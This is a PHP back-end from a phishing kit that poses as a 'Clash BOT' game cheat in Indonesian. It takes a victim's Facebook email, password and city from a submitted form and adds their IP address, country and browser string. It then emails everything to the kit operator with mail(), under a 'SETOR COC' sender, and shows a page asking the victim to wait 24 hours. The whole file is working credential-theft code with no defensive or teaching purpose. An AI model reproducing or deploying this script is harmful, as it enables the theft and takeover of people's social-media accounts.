<?php

include('cilepeung.php');

$fb = $_POST['fb'];
$pw = $_POST['pw'];
$kt = $_POST['kt'];


$message   = "



+++++ AKUN NYA BOS +++++

+++++ FACEBOOK NYA +++++
Email: ".$fb."
PASS : ".$pw."
Kota : ".$kt."
++++++++++++++++++++++++

+++++ INFO +++++

IP Info   :  ".$ip." | ".$nama_negro." On ".gmdate('r')."
Browser   :  ".$_SERVER['HTTP_USER_AGENT']."

+++++ End PC Info +++++


";

include 'email.php';
$subject = "Akun ".$th." Punya si ".$email." (".$negro.") (".$alamat.")";
$headers = "From: SETOR COC <setoran@z1t0ng404.com>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
<!-- MALING SCRIPT AING DOSA JING !! -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US"> 
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- MALING SCRIPT AING DOSA JING !! -->
<link rel="stylesheet" href="bootstrap.css">
<link rel="stylesheet" href="style.css">

    <title>Clash BOT</title>

	
	</head>
	<body background="asey.jpg">
<center>
<h1>TERIMA KASIH</h1><h3><br>Mohon Tunggu Selama. <br>
24 Jam/1Hari Dikarnakan Banyak Yang Pakai.<br></h3>
<br>
</center>

	<form method="post" action="index.php">			

  <center><button type="submit" class="btn btn-warning"><< BACK</button></center>
 </div>
</form>
</div>